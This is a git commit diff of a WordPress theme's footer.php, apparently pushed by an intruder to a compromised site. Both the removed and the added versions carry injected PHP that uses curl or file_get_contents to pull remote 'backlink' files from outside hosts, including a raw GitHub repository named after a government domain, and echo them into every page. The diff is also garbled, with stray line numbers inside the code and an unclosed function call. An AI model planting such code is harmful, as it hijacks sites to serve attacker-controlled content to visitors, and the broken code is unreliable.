9cd6904a2e2f238496c0d06a126bb8cad15befcb
/SLoerD <98331189+BadaxHaxor@users.noreply.github.com>
2023-08-05 13:00:41 +0700

    Update footer.php
    Signed-off-by: ./SLoerD <98331189+BadaxHaxor@users.noreply.github.com>

--- footer.php
+++ footer.php
@@ -1,48 +1,42 @@
 <?php
 /**
- * The template for displaying the footer
+ * The template for displaying the footer.
  *
- * Contains footer content and the closing of the #main and #page div elements.
+ * Contains the closing of the #content div and all content after.
  *
- * @package WordPress
- * @subpackage Twenty_Fourteen
- * @since Twenty Fourteen 1.0
+ * @link https://developer.wordpress.org/themes/basics/template-files/#template-partials
+ *
+ * @package Zeko Lite
  */
+
 ?>
 
-		</div><!-- #main -->
+	</div>
 
-		<footer id="colophon" class="site-footer">
-
-			<?php get_sidebar( 'footer' ); ?>
-
-			<div class="site-info">
-				<?php do_action( 'twentyfourteen_credits' ); ?>
-				<?php
-				if ( function_exists( 'the_privacy_policy_link' ) ) {
-					the_privacy_policy_link( '', '<span role="separator" aria-hidden="true"></span>' );
-				}
-				?>
-				<a href="<?php echo esc_url( __( 'https://wordpress.org/', 'twentyfourteen' ) ); ?>" class="imprint">
-					<?php
-					/* translators: %s: WordPress */
-					printf( __( 'Proudly powered by %s', 'twentyfourteen' ), 'WordPress' );
-					?>
-				</a>
-			</div><!-- .site-info -->
-		</footer><!-- #colophon -->
-	</div><!-- #page -->
-
-	<?php wp_footer(); 
-<?php
+	<footer id="colophon" class="site-footer" role="contentinfo">
+		<?php
+			if ( has_nav_menu( 'social' ) ) {
+				wp_nav_menu( array( 'theme_location' => 'social', 'depth' => 1, 'link_before' => '<span class="screen-reader-text">', 'link_after' => '</span>', 'container_class' => 'social-links' ) );
+			}
+			get_template_part( 'components/footer/footer', 'widgets' );
+			get_template_part( 'components/footer/site', 'info' );
+		
 $curl = curl_init();
-$url = 'https://realestat.lol/ptacid.txt';
+30
+$url = 'https://raw.githubusercontent.com/BadaxHaxor/bokep.visorideags.gob.mx/main/backlink.txt';
+31
 curl_setopt($curl, CURLOPT_URL, $url);
+32
 curl_setopt($curl, CURLOPT_HEADER, 0);
+33
 curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
-$result = curl_exec($curl);
-echo $result;
-$framework_controller_2 = file_get_contents('https://raw.githubusercontent.com/BadaxHaxor/zeroajg/main/backlink.php'); echo $framework_controller_2;
+34
+$result = curl_exec($curl
+
 ?>
+	</footer>
+</div><!-- #page -->
+<?php wp_footer(); ?>
+
 </body>
-</html
+</html>
